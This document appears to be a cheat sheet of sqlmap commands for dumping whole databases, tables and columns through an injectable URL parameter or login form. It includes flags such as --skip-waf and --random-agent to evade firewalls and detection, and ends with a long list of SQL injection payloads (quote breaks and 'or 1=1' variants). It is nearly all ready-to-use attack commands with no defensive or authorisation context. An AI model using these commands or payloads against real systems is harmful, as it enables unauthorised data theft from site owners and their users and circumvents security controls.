						
<h2>SQLmap Usage</h2>


 **To Fetch Only Column's Data**                        
 ```
  sqlmap - u "url?prm=" -p prm -D dbname -T table_name -C column_name --dump
```
 **To Fetch Only All Column & Its Data**          
 ```
sqlmap - u "url?prm=" -p prm -D dbname -T table_name  --dump
```

 **To Fetch Entire Database's Data** 		     
 ```
sqlmap - u "url?prm=" -p prm -D dbname  --dump
```

 **To Fetch All Databases**
 ```
 sqlmap - u "url?prm=" -p prm --dbs  --dump
``` 
 *or use --dump-all instead of --dump to fetch all databases's all tables and columns*


<h4>Extra Parameter to Optimise SQLmap's Performance</h4>

 * **Parameters**      `--method GET,   --code 200, --skip-waf, --random-agent, --threads 10 -o `
 
* **Optimised Url**

 For GET Request
```
sqlmap -u "url?prm=" -p prm -D dbname -T table_name -C column_name --dump --method GET --code 200 --skip-waf --random-agent --threads 10 -o
```
 For POST Request
```
sqlmap -u "url/login" --data "username=a&password=b&xyz=c" -p "username,password" --method POST --skip-waf --random-agent --threads 10 -o --dbs --dump

```

<h2> SQL Injection Confirmation<h2>
 
 ```
 http://hack.com/’

 http://hack.com/"

 or 1=1 

 ‘or 1=1

 “or 1=1

  or 1=1–

 ‘or 1=1–

 “or 1=1–

  or 1=1#

 ‘or 1=1#

 “or

  1=1#

  or 1=1/*

 ‘or 1=1/*

 “or 1=1/*

  or 1=1;%00

 ‘or 1=1;%00

 “or 1=1;%00

 ‘or’

 ‘or

 ‘or’–

 ‘or–

  or a=a

 ‘or a=a

 “or a=a

  or a=a–

 ‘or a=a —

 “or a=a–

  or ‘a’=’a’

 ‘or ‘a’=’a’

 “or ‘a’=’a’

 ‘)or(‘a’=’a’

 “)”a”=”a”

 ‘)’a’=’a

 ‘or”=’
```
